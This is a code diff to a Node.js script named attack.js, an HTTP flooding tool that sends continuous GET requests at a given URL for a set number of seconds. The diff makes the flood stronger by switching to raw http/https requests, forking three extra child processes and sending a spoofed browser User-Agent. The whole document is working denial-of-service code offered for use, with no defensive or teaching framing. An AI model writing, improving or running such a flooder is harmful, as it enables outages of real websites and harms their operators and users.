@@ -1,38 +1,51 @@
-const axios = require('axios');
+const http = require('http');
+const https = require('https');
+const { URL } = require('url');
+const { fork } = require('child_process');
 
-// Args: node attack.js <target_url> <time_in_seconds>
-const [,, targetUrl, timeInSeconds] = process.argv;
+const [,, target, duration, isChild] = process.argv;
 
-if (!targetUrl || !timeInSeconds) {
-  console.log('Usage: node attack.js <target_url> <time_in_seconds>');
+if (!target || !duration) {
+  console.log('Usage: node attack.js <url> <seconds>');
   process.exit(1);
 }
 
-const durationMs = parseInt(timeInSeconds, 10) * 1000;
-if (isNaN(durationMs) || durationMs <= 0) {
-  console.log('Please provide a valid time in seconds.');
-  process.exit(1);
+// Auto-spawn 3 child processes if this is the main process
+if (!isChild) {
+  for (let i = 0; i < 3; i++) {
+    fork(__filename, [target, duration, 'child']);
+  }
+  console.log(`Started 3 extra processes for flooding ${target}`);
 }
 
-let totalRequests = 0;
+const url = new URL(target);
+const endTime = Date.now() + parseInt(duration) * 1000;
+const isHttps = url.protocol === 'https:';
+const client = isHttps ? https : http;
 
-// Clear terminal and print start banner
-console.clear();
-console.log('C-SHARK! - ATTACK STARTED');
+function flood() {
+  while (Date.now() < endTime) {
+    const options = {
+      hostname: url.hostname,
+      port: url.port || (isHttps ? 443 : 80),
+      path: url.pathname + url.search,
+      method: 'GET',
+      headers: {
+        'User-Agent': 'Mozilla/5.0',
+        'Accept': '*/*',
+        'Connection': 'keep-alive',
+      }
+    };
 
-const startTime = Date.now();
-const stopTime = startTime + durationMs;
+    const req = client.request(options, res => {
+      res.on('data', () => {});
+    });
 
-// Continuous flooder
-const flood = async () => {
-  while (Date.now() < stopTime) {
-    axios.get(targetUrl).catch(() => {}); // Ignore errors
-    totalRequests++;
+    req.on('error', () => {});
+    req.end();
   }
 
-  // After flood ends
-  console.log('\nATTACK DONE');
-  console.log('Total requests sent:', totalRequests);
-};
+  console.log('Flood ended.');
+}
 
 flood();
